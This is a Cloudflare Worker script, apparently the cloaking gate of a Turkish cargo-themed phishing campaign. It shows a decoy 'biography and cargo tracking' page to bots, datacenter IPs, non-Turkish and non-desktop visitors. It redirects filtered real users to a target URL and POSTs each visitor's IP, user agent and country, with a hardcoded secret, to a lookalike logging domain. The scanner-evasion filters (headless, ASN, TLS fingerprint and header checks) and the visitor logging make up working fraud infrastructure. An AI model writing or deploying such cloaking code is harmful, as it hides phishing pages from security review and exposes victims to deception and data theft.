addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {

  const url = new URL(request.url)
  const method = request.method
  const userAgent = request.headers.get("user-agent") || ""
  const ip = request.headers.get("cf-connecting-ip") || ""
  const country = request.headers.get("cf-ipcountry") || "XX"
  const accept = request.headers.get("accept") || ""
  const acceptLang = request.headers.get("accept-language") || ""
  const secChUa = request.headers.get("sec-ch-ua") || ""
  const referer = request.headers.get("referer") || ""
  const cookie = request.headers.get("cookie") || ""
  const secFetchDest = request.headers.get("sec-fetch-dest") || ""
  const secFetchMode = request.headers.get("sec-fetch-mode") || ""
  const tlsFingerprint = request.headers.get("cf-ja3-fingerprint") || ""
  const asn = request.headers.get("cf-asn") || ""
  const acceptEncoding = request.headers.get("accept-encoding") || ""

  const TARGET_URL = "https:\/\/www.yurticikargo.com\/"
  const ALLOWED_COUNTRY = "TR"
  const ENABLED_BOT_FILTERS = ["headless","datacenter","ua","behavior","js_challenge","rate_limit","fingerprint"]
  const ENABLED_DEVICES = ["desktop"]
  const CAMPAIGN_ID = "cmp_69a350bb8f29a"
  const LOG_ENDPOINT = "https:\/\/gonderisorgula.xyz\/api\/log_visit.php"
  const WORKER_SECRET = "cok_guclu_uzun_random_bir_secret_123XYZ"
  const INDEX_HTML = "<!DOCTYPE html><html lang=\"tr\"><head>    <meta charset=\"UTF-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">    <title>Biyografi & Kargo Takip<\/title>    <link rel=\"stylesheet\" href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\">    <style>        * {            margin: 0;            padding: 0;            box-sizing: border-box;            font-family: \\'Segoe UI\\', Tahoma, Geneva, Verdana, sans-serif;        }                body {            background-color: #f5f7fa;            color: #333;            line-height: 1.6;        }                .container {            max-width: 1200px;            margin: 0 auto;            padding: 0 20px;        }                \/* Header Stilleri *\/        header {            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);            color: white;            padding: 1.5rem 0;            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);        }                .header-content {            display: flex;            justify-content: space-between;            align-items: center;        }                .logo {            font-size: 1.8rem;            font-weight: 700;            display: flex;            align-items: center;        }                .logo i {            margin-right: 10px;            color: #ffcc00;        }                nav ul {            display: flex;            list-style: none;        }                nav ul li {            margin-left: 1.5rem;        }                nav ul li a {            color: white;            text-decoration: none;            font-weight: 500;            padding: 8px 12px;            border-radius: 4px;            transition: background 0.3s;        }                nav ul li a:hover, nav ul li a.active {            background-color: rgba(255, 255, 255, 0.15);        }                \/* Ana \u0130\u00e7erik *\/        main {            padding: 2.5rem 0;        }                .section-title {            text-align: center;            margin-bottom: 2.5rem;            color: #1e3c72;            position: relative;        }                .section-title:after {            content: \\'\\';            position: absolute;            width: 80px;            height: 4px;            background-color: #2a5298;            bottom: -10px;            left: 50%;            transform: translateX(-50%);            border-radius: 2px;        }                \/* Biyografi Kart\u0131 *\/        .profile-card {            background: white;            border-radius: 12px;            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);            padding: 2.5rem;            display: flex;            flex-direction: column;            align-items: center;            margin-bottom: 3rem;            overflow: hidden;        }                .profile-img {            width: 180px;            height: 180px;            border-radius: 50%;            object-fit: cover;            border: 6px solid #f0f4ff;            margin-bottom: 1.5rem;            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);        }                .profile-name {            font-size: 2.2rem;            color: #1e3c72;            margin-bottom: 0.5rem;        }                .profile-title {            font-size: 1.2rem;            color: #2a5298;            margin-bottom: 1.5rem;            font-weight: 500;        }                .profile-bio {            text-align: center;            max-width: 800px;            margin-bottom: 2rem;            color: #555;            font-size: 1.05rem;            line-height: 1.8;        }                .social-links {            display: flex;            gap: 1rem;            margin-bottom: 2rem;        }                .social-icon {            display: flex;            align-items: center;            justify-content: center;            width: 45px;            height: 45px;            background-color: #f0f4ff;            border-radius: 50%;            color: #2a5298;            font-size: 1.2rem;            transition: all 0.3s;        }                .social-icon:hover {            background-color: #2a5298;            color: white;            transform: translateY(-3px);        }                \/* Kargo Takip B\u00f6l\u00fcm\u00fc *\/        .tracking-section {            background-color: white;            border-radius: 12px;            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);            padding: 2.5rem;        }                .tracking-description {            text-align: center;            margin-bottom: 2rem;            color: #555;            font-size: 1.05rem;        }                .tracking-buttons {            display: grid;            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));            gap: 1.5rem;            margin-bottom: 2rem;        }                .tracking-btn {            display: flex;            flex-direction: column;            align-items: center;            justify-content: center;            padding: 1.8rem 1.5rem;            background-color: #f8faff;            border: 2px solid #e3e9ff;            border-radius: 10px;            text-decoration: none;            color: #333;            transition: all 0.3s;            text-align: center;        }                .tracking-btn:hover {            background-color: #eef2ff;            border-color: #2a5298;            transform: translateY(-5px);            box-shadow: 0 8px 15px rgba(42, 82, 152, 0.1);        }                .tracking-btn i {            font-size: 2.5rem;            margin-bottom: 1rem;            color: #1e3c72;        }                .tracking-btn-title {            font-size: 1.3rem;            font-weight: 600;            margin-bottom: 0.5rem;            color: #1e3c72;        }                .tracking-btn-desc {            color: #666;            font-size: 0.95rem;        }                \/* Kargo Takip Formu *\/        .tracking-form-container {            background-color: #f8faff;            border-radius: 10px;            padding: 2rem;            margin-top: 2rem;            border-left: 5px solid #2a5298;        }                .form-title {            color: #1e3c72;            margin-bottom: 1.5rem;            display: flex;            align-items: center;            gap: 10px;        }                .tracking-form {            display: flex;            flex-wrap: wrap;            gap: 1rem;            align-items: flex-end;        }                .form-group {            flex: 1;            min-width: 250px;        }                .form-group label {            display: block;            margin-bottom: 8px;            font-weight: 500;            color: #555;        }                .form-group input, .form-group select {            width: 100%;            padding: 14px;            border: 1px solid #ddd;            border-radius: 8px;            font-size: 1rem;            transition: border 0.3s;        }                .form-group input:focus, .form-group select:focus {            border-color: #2a5298;            outline: none;        }                .submit-btn {            background-color: #2a5298;            color: white;            border: none;            padding: 14px 28px;            border-radius: 8px;            font-size: 1rem;            font-weight: 600;            cursor: pointer;            transition: background 0.3s;            min-width: 150px;        }                .submit-btn:hover {            background-color: #1e3c72;        }                \/* Footer *\/        footer {            background-color: #1a1a2e;            color: #ddd;            padding: 2.5rem 0;            margin-top: 3rem;        }                .footer-content {            display: flex;            flex-wrap: wrap;            justify-content: space-between;        }                .footer-column {            flex: 1;            min-width: 250px;            margin-bottom: 1.5rem;        }                .footer-column h3 {            color: white;            margin-bottom: 1.2rem;            font-size: 1.3rem;            position: relative;            padding-bottom: 8px;        }                .footer-column h3:after {            content: \\'\\';            position: absolute;            width: 40px;            height: 3px;            background-color: #2a5298;            bottom: 0;            left: 0;        }                .footer-column ul {            list-style: none;        }                .footer-column ul li {            margin-bottom: 0.8rem;        }                .footer-column ul li a {            color: #bbb;            text-decoration: none;            transition: color 0.3s;        }                .footer-column ul li a:hover {            color: white;        }                .copyright {            text-align: center;            padding-top: 2rem;            margin-top: 2rem;            border-top: 1px solid #333;            color: #999;            font-size: 0.9rem;        }                \/* Responsive Tasar\u0131m *\/        @media (max-width: 768px) {            .header-content {                flex-direction: column;                text-align: center;            }                        nav ul {                margin-top: 1.5rem;                justify-content: center;            }                        nav ul li {                margin: 0 0.5rem;            }                        .profile-card {                padding: 1.8rem;            }                        .profile-name {                font-size: 1.8rem;            }                        .tracking-section {                padding: 1.8rem;            }                        .tracking-form {                flex-direction: column;            }                        .form-group {                min-width: 100%;            }        }    <\/style><\/head><body>    <!-- Header B\u00f6l\u00fcm\u00fc -->    <header>        <div class=\"container header-content\">            <div class=\"logo\">                <i class=\"fas fa-user-tie\"><\/i>                <span>Biyografi & Kargo Takip<\/span>            <\/div>            <nav>                <ul>                    <li><a href=\"#profile\" class=\"active\">Profil<\/a><\/li>                    <li><a href=\"#tracking\">Kargo Takip<\/a><\/li>                    <li><a href=\"#contact\">\u0130leti\u015fim<\/a><\/li>                <\/ul>            <\/nav>        <\/div>    <\/header>    <main class=\"container\">        <!-- Biyografi B\u00f6l\u00fcm\u00fc -->        <section id=\"profile\">            <h2 class=\"section-title\">Profilim<\/h2>            <div class=\"profile-card\">                <img src=\"https:\/\/randomuser.me\/api\/portraits\/men\/75.jpg\" alt=\"Profil Resmi\" class=\"profile-img\">                <h1 class=\"profile-name\">Ahmet Y\u0131lmaz<\/h1>                <div class=\"profile-title\">Lojistik M\u00fcd\u00fcr\u00fc & E-ticaret Dan\u0131\u015fman\u0131<\/div>                <p class=\"profile-bio\">                    15 y\u0131l\u0131 a\u015fk\u0131n s\u00fcredir lojistik ve tedarik zinciri y\u00f6netimi alan\u0131nda \u00e7al\u0131\u015fmaktay\u0131m. \u00dc\u00e7 farkl\u0131 k\u0131tada projeler y\u00f6nettim ve \u015fu anda \u00f6nde gelen bir e-ticaret firmas\u0131nda lojistik operasyonlar\u0131ndan sorumluyum. Kargo ve nakliye s\u00fcre\u00e7lerinin optimizasyonu, m\u00fc\u015fteri memnuniyeti ve dijital d\u00f6n\u00fc\u015f\u00fcm konular\u0131nda uzman\u0131m. Ayr\u0131ca, lojistik teknolojileri ve s\u00fcrd\u00fcr\u00fclebilir tedarik zinciri \u00fczerine dan\u0131\u015fmanl\u0131k hizmetleri veriyorum.                <\/p>                <div class=\"social-links\">                    <a href=\"#\" class=\"social-icon\"><i class=\"fab fa-linkedin-in\"><\/i><\/a>                    <a href=\"#\" class=\"social-icon\"><i class=\"fab fa-twitter\"><\/i><\/a>                    <a href=\"#\" class=\"social-icon\"><i class=\"fab fa-instagram\"><\/i><\/a>                    <a href=\"#\" class=\"social-icon\"><i class=\"fab fa-github\"><\/i><\/a>                <\/div>            <\/div>        <\/section>        <!-- Kargo Takip B\u00f6l\u00fcm\u00fc -->        <section id=\"tracking\">            <h2 class=\"section-title\">Kargo Takip<\/h2>            <div class=\"tracking-section\">                <p class=\"tracking-description\">                    A\u015fa\u011f\u0131daki butonlardan kargo firmalar\u0131n\u0131n takip sayfalar\u0131na h\u0131zl\u0131ca ula\u015fabilir veya takip numaran\u0131z\u0131 do\u011frudan a\u015fa\u011f\u0131daki formdan sorgulayabilirsiniz.                <\/p>                                <div class=\"tracking-buttons\">                    <a href=\"https:\/\/www.yurticikargo.com\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-shipping-fast\"><\/i>                        <div class=\"tracking-btn-title\">Yurti\u00e7i Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                                        <a href=\"https:\/\/www.mngkargo.com.tr\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-truck\"><\/i>                        <div class=\"tracking-btn-title\">MNG Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                                        <a href=\"https:\/\/www.aras.kargo.com.tr\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-box\"><\/i>                        <div class=\"tracking-btn-title\">Aras Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                                        <a href=\"https:\/\/www.ptt.gov.tr\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-mail-bulk\"><\/i>                        <div class=\"tracking-btn-title\">PTT Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                                        <a href=\"https:\/\/www.suratkargo.com.tr\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-parachute-box\"><\/i>                        <div class=\"tracking-btn-title\">S\u00fcrat Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                                        <a href=\"https:\/\/www.ups.com\/tr\/tr\/Home.page\" target=\"_blank\" class=\"tracking-btn\">                        <i class=\"fas fa-globe\"><\/i>                        <div class=\"tracking-btn-title\">UPS Kargo<\/div>                        <div class=\"tracking-btn-desc\">Kargo takip i\u00e7in t\u0131klay\u0131n<\/div>                    <\/a>                <\/div>                                <div class=\"tracking-form-container\">                    <h3 class=\"form-title\"><i class=\"fas fa-search\"><\/i> Kargo Sorgulama<\/h3>                    <form class=\"tracking-form\" id=\"trackingForm\">                        <div class=\"form-group\">                            <label for=\"courier\">Kargo Firmas\u0131<\/label>                            <select id=\"courier\" name=\"courier\" required>                                <option value=\"\">Firma Se\u00e7iniz<\/option>                                <option value=\"yurtici\">Yurti\u00e7i Kargo<\/option>                                <option value=\"mng\">MNG Kargo<\/option>                                <option value=\"aras\">Aras Kargo<\/option>                                <option value=\"ptt\">PTT Kargo<\/option>                                <option value=\"surat\">S\u00fcrat Kargo<\/option>                                <option value=\"ups\">UPS Kargo<\/option>                            <\/select>                        <\/div>                                                <div class=\"form-group\">                            <label for=\"trackingNumber\">Takip Numaras\u0131<\/label>                            <input type=\"text\" id=\"trackingNumber\" name=\"trackingNumber\" placeholder=\"\u00d6rn: XYZ123456789\" required>                        <\/div>                                                <button type=\"submit\" class=\"submit-btn\">Kargom\u0131 Sorgula<\/button>                    <\/form>                <\/div>            <\/div>        <\/section>    <\/main>    <!-- Footer B\u00f6l\u00fcm\u00fc -->    <footer id=\"contact\">        <div class=\"container\">            <div class=\"footer-content\">                <div class=\"footer-column\">                    <h3>\u0130leti\u015fim Bilgileri<\/h3>                    <ul>                        <li><i class=\"fas fa-map-marker-alt\"><\/i> \u0130stanbul, T\u00fcrkiye<\/li>                        <li><i class=\"fas fa-phone\"><\/i> +90 (555) 123 45 67<\/li>                        <li><i class=\"fas fa-envelope\"><\/i> info@ahmetyilmaz.com<\/li>                    <\/ul>                <\/div>                                <div class=\"footer-column\">                    <h3>H\u0131zl\u0131 Ba\u011flant\u0131lar<\/h3>                    <ul>                        <li><a href=\"#profile\">Profilim<\/a><\/li>                        <li><a href=\"#tracking\">Kargo Takip<\/a><\/li>                        <li><a href=\"#\">Blog Yaz\u0131lar\u0131m<\/a><\/li>                        <li><a href=\"#\">Referanslar<\/a><\/li>                    <\/ul>                <\/div>                                <div class=\"footer-column\">                    <h3>Kargo Firmalar\u0131<\/h3>                    <ul>                        <li><a href=\"https:\/\/www.yurticikargo.com\" target=\"_blank\">Yurti\u00e7i Kargo<\/a><\/li>                        <li><a href=\"https:\/\/www.mngkargo.com.tr\" target=\"_blank\">MNG Kargo<\/a><\/li>                        <li><a href=\"https:\/\/www.aras.kargo.com.tr\" target=\"_blank\">Aras Kargo<\/a><\/li>                        <li><a href=\"https:\/\/www.ptt.gov.tr\" target=\"_blank\">PTT Kargo<\/a><\/li>                    <\/ul>                <\/div>            <\/div>                        <div class=\"copyright\">                &copy; 2023 Ahmet Y\u0131lmaz. T\u00fcm haklar\u0131 sakl\u0131d\u0131r.            <\/div>        <\/div>    <\/footer>    <script>        \/\/ Form g\u00f6nderimi i\u00e7in basit bir kontrol        document.getElementById(\\'trackingForm\\').addEventListener(\\'submit\\', function(e) {            e.preventDefault();                        const courier = document.getElementById(\\'courier\\').value;            const trackingNumber = document.getElementById(\\'trackingNumber\\').value;                        if (!courier || !trackingNumber) {                alert(\\'L\u00fctfen kargo firmas\u0131 ve takip numaras\u0131 giriniz.\\');                return;            }                        \/\/ Ger\u00e7ek bir uygulamada burada API \u00e7a\u011fr\u0131s\u0131 yap\u0131l\u0131r            \/\/ \u015eimdilik sadece bilgi mesaj\u0131 g\u00f6sterelim            const courierNames = {                \\'yurtici\\': \\'Yurti\u00e7i Kargo\\',                \\'mng\\': \\'MNG Kargo\\',                \\'aras\\': \\'Aras Kargo\\',                \\'ptt\\': \\'PTT Kargo\\',                \\'surat\\': \\'S\u00fcrat Kargo\\',                \\'ups\\': \\'UPS Kargo\\'            };                        alert(`Kargo Sorgulama \u0130ste\u011fi:\\nFirma: ${courierNames[courier]}\\nTakip No: ${trackingNumber}\\n\\nBu bir demo uygulamas\u0131d\u0131r. Ger\u00e7ek uygulamada kargo durumu g\u00f6sterilir.`);                        \/\/ Formu temizle            document.getElementById(\\'trackingForm\\').reset();        });                \/\/ Navigasyon linklerine aktif s\u0131n\u0131f\u0131 ekleme        document.querySelectorAll(\\'nav a\\').forEach(link => {            link.addEventListener(\\'click\\', function() {                document.querySelectorAll(\\'nav a\\').forEach(item => item.classList.remove(\\'active\\'));                this.classList.add(\\'active\\');            });        });    <\/script><\/body><\/html>"

  let detectedBy = null
  let logSent = false

  async function sendLog(isBot, filterHit = null) {
	  // BU İSTEK ZATEN LOGLANDI MI? (IP + campaign_id + 1 saniye)
	  const now = Date.now()
	  const requestKey = ip + "_" + CAMPAIGN_ID
	  
	  if (!globalThis.__lastLogTime) globalThis.__lastLogTime = new Map()
	  
	  const lastLog = globalThis.__lastLogTime.get(requestKey)
	  if (lastLog && now - lastLog < 100) {
		console.log("Log skipped (rate limit):", requestKey)
		return // 1 saniyede 1'den fazla log atma
	  }
	  
	  globalThis.__lastLogTime.set(requestKey, now)

	  if (logSent) return
	  logSent = true

	  try {
		await fetch(LOG_ENDPOINT, {
		  method: "POST",
		  headers: { 
			"Content-Type": "application/json",
			"X-Worker-Secret": WORKER_SECRET
		  },
		  body: JSON.stringify({
			campaign_id: CAMPAIGN_ID,
			ip: ip,
			user_agent: userAgent,
			country: country,
			is_bot: isBot,
			filter_hit: filterHit,
			status: isBot ? "blocked" : "allowed",
			timestamp: new Date().toISOString()
		  })
		})
	  } catch (e) {
		console.error("Log error:", e)
	  }
	}

function checkBot() {
  let detectedFilters = []  // Yakalanan filtreler burada birikecek

  // 1. Headless Browser Tespiti
  if (ENABLED_BOT_FILTERS.includes("headless") && /HeadlessChrome|puppeteer|selenium|phantomjs|webdriver/i.test(userAgent)) {
    detectedFilters.push("headless")
  }

  // 2. User-Agent Anormalliği
  if (ENABLED_BOT_FILTERS.includes("ua") && (userAgent.length < 40 || !/Chrome|Firefox|Safari|Edg/i.test(userAgent))) {
    detectedFilters.push("ua")
  }

  // 3. Datacenter Tespiti
  if (ENABLED_BOT_FILTERS.includes("datacenter")) {
    const dcASNs = ['16509', '14061', '20473', '16276', '24940', '14618', '15169']
    if (dcASNs.includes(asn)) {
      detectedFilters.push("datacenter")
    }
  }

  // 4. Accept Mismatch
  if (ENABLED_BOT_FILTERS.includes("accept_mismatch")) {
    if (!accept || !accept.includes("text/html")) {
      detectedFilters.push("accept_mismatch")
    }
  }

  // 5. Header Consistency
  if (ENABLED_BOT_FILTERS.includes("header_consistency")) {
    if (!accept || !acceptLang || !secChUa) {
      detectedFilters.push("header_consistency")
    }
  }
	
  // 6. Navigation Token (BU FONKSİYON RETURN KULLANIYOR, DİKKAT!)
  if (ENABLED_BOT_FILTERS.includes("navigation_token")) {
    const token = url.searchParams.get("nv")
    if (!token) {
      const newUrl = new URL(request.url)
      newUrl.searchParams.set("nv", crypto.randomUUID())
      return { redirect: newUrl.toString() }  // Özel durum: yönlendirme yap
    }
  }
	
  // 7. Behavioral Delay
  if (ENABLED_BOT_FILTERS.includes("behavioral_delay")) {
    if (!globalThis.__delayMap) globalThis.__delayMap = {}
    const now = Date.now()
    if (globalThis.__delayMap[ip] && now - globalThis.__delayMap[ip] < 300) {
      detectedFilters.push("behavioral_delay")
    }
    globalThis.__delayMap[ip] = now
  }
	
  // 8. Advanced JS (BU FONKSİYON RETURN KULLANIYOR, DİKKAT!)
  if (ENABLED_BOT_FILTERS.includes("advanced_js")) {
    if (!cookie.includes("adv_verified=true")) {
      return { html: "<html><body><script>setTimeout(()=>{document.cookie='adv_verified=true; path=/'; location.reload();},300);</script></body></html>" }
    }
  }
	
  // 9. Fingerprint V2
  if (ENABLED_BOT_FILTERS.includes("fingerprint_v2")) {
    const fp = userAgent + accept + acceptLang + secChUa + tlsFingerprint + country
    const now = Date.now()
    
    if (!globalThis.__fpv2) globalThis.__fpv2 = {}
    
    if (globalThis.__fpv2[fp]) {
      const lastVisit = globalThis.__fpv2[fp].lastVisit
      const visitCount = globalThis.__fpv2[fp].count
      
      if (now - lastVisit < 1000 && visitCount >= 3) {
        detectedFilters.push("fingerprint_v2_flood")
      } else if (now - lastVisit < 10000 && visitCount >= 5) {
        detectedFilters.push("fingerprint_v2_rapid")
      }
      
      globalThis.__fpv2[fp] = {
        lastVisit: now,
        count: visitCount + 1
      }
    } else {
      globalThis.__fpv2[fp] = {
        lastVisit: now,
        count: 1
      }
    }
  }
	
  // 10. TLS/UA Uyumu
  if (ENABLED_BOT_FILTERS.includes("tls_ua_check") && tlsFingerprint) {
    if (userAgent.includes("Chrome") && !tlsFingerprint.startsWith("6734") && !tlsFingerprint.startsWith("aa")) {
      detectedFilters.push("tls_ua_chrome_mismatch")
    }
    if (userAgent.includes("Firefox") && !tlsFingerprint.startsWith("b323")) {
      detectedFilters.push("tls_ua_firefox_mismatch")
    }
    if (userAgent.includes("Safari") && !tlsFingerprint.startsWith("a74c")) {
      detectedFilters.push("tls_ua_safari_mismatch")
    }
  }
	
  // 11. Dil/Ülke Tutarlılığı
  if (ENABLED_BOT_FILTERS.includes("lang_country_check") && acceptLang && country) {
    const primaryLang = acceptLang.split(',')[0].split('-')[0].toLowerCase()
    if (primaryLang === 'tr' && !['TR', 'CY'].includes(country)) {
      detectedFilters.push("lang_country_mismatch")
    }
  }
	
  // 12. Accept-Encoding Kontrolü
  if (ENABLED_BOT_FILTERS.includes("encoding_check") && acceptEncoding) {
    if (!acceptEncoding.includes("gzip") && !acceptEncoding.includes("br") && !acceptEncoding.includes("deflate")) {
      detectedFilters.push("encoding_abnormal")
    }
  }
	
  // 13. Referrer Doğrulama
  if (ENABLED_BOT_FILTERS.includes("referrer_check") && referer) {
    const searchEngines = /google|bing|yahoo|yandex|duckduckgo|baidu/
    if (!searchEngines.test(referer) && !referer.includes(url.hostname)) {
      detectedFilters.push("suspicious_referer")
    }
  }
	
  // 14. Header Bütünlüğü
  if (ENABLED_BOT_FILTERS.includes("header_integrity")) {
    let missingCount = 0
    if (!accept) missingCount += 2
    if (!acceptLang) missingCount++
    if (!acceptEncoding) missingCount++
    if (!secChUa) missingCount += 2
    if (!secFetchDest) missingCount++
    if (!secFetchMode) missingCount++
    
    if (missingCount >= 5) {
      detectedFilters.push("header_missing_many")
    }
  }

  // Normal dönüş: yakalanan filtreler
  return { filters: detectedFilters }
}

  function isAllowedDevice() {
    if (ENABLED_DEVICES.length === 0) return true
    const isMobile = /Mobi|Android/i.test(userAgent)
    const isTablet = /Tablet|iPad/i.test(userAgent)
    const isDesktop = !isMobile && !isTablet
    if (isMobile && ENABLED_DEVICES.includes("mobile")) return true
    if (isTablet && ENABLED_DEVICES.includes("tablet")) return true
    if (isDesktop && ENABLED_DEVICES.includes("desktop")) return true
    return false
  }

  // SADECE GERÇEK SAYFA NAVIGASYONU LOG ATAR
  const isRealPageVisit =
    method === "GET" &&
    accept.includes("text/html") &&
    (secFetchDest === "document" || secFetchMode === "navigate")

  // Ülke kontrolü
  if (country !== ALLOWED_COUNTRY) {
    await sendLog(true, "country")
    return new Response(INDEX_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html" }
    })
  }

  // Bot tespiti
  // Bot kontrolü
const checkResult = checkBot()

// Özel durumlar (yönlendirme veya html gösterimi)
if (checkResult.redirect) {
  return Response.redirect(checkResult.redirect, 302)
}
if (checkResult.html) {
  return new Response(checkResult.html, { headers: { "Content-Type": "text/html" } })
}

// Normal bot kontrolü
const detectedFilters = checkResult.filters || []
const isBot = detectedFilters.length > 0
const filterHit = detectedFilters.join(',')

if (isBot) {
  await sendLog(true, filterHit)
  return new Response(INDEX_HTML, {
    status: 200,
    headers: { "Content-Type": "text/html" }
  })
}

  // Cihaz kontrolü
  if (!isAllowedDevice()) {
    await sendLog(true, "device")
    return new Response(INDEX_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html" }
    })
  }

  // İnsan logu
  if (isRealPageVisit) {
    const hasNavToken = !ENABLED_BOT_FILTERS.includes("navigation_token") || url.searchParams.get("nv")
    const hasAdvancedCookie = !ENABLED_BOT_FILTERS.includes("advanced_js") || cookie.includes("adv_verified=true")

    if (hasNavToken && hasAdvancedCookie) {
      await sendLog(false, null)
    }
  }

  return Response.redirect(TARGET_URL, 302)

}